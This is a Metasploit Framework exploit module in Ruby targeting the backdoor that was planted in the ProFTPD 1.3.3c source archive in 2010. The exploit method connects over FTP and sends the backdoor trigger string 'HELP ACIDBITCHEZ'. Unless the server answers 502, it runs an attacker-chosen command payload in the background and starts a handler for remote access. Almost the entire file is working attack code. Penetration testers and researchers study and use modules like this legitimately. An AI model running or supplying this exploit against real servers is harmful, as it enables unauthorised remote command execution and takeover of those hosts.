##
# $Id: proftpd_133c_backdoor.rb 11210 2010-12-02 22:33:37Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ProFTPD-1.3.3c Backdoor Command Execution',
			'Description'    => %q{
					This module exploits a malicious backdoor that was added to the
				ProFTPD download archive. This backdoor was present in the proftpd-1.3.3c.tar.[bz2|gz]
				archive between November 28th 2010 and 2nd December 2010.
			},
			'Author'         => [ 'MC', 'darkharper2' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11210 $',
			'References'     =>
				[
					[ 'BID', '45150' ],
					[ 'URL', 'http://sourceforge.net/mailarchive/message.php?msg_name=alpine.DEB.2.00.1012011542220.12930%40familiar.castaglia.org' ],
				],
			'Privileged'     => true,
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'Dec 2 2010',
			'DefaultTarget' => 0))

		deregister_options('FTPUSER', 'FTPPASS')
	end

	def exploit

		connect

		print_status("Sending Backdoor Command")
		sock.put("HELP ACIDBITCHEZ\r\n")

		res = sock.get_once(-1,10)
	
		if ( res and res =~ /502/ )
			print_error("Not backdoored")
		else
			sock.put("nohup " + payload.encoded + " >/dev/null 2>&1\n")
			handler
		end

		disconnect

	end

end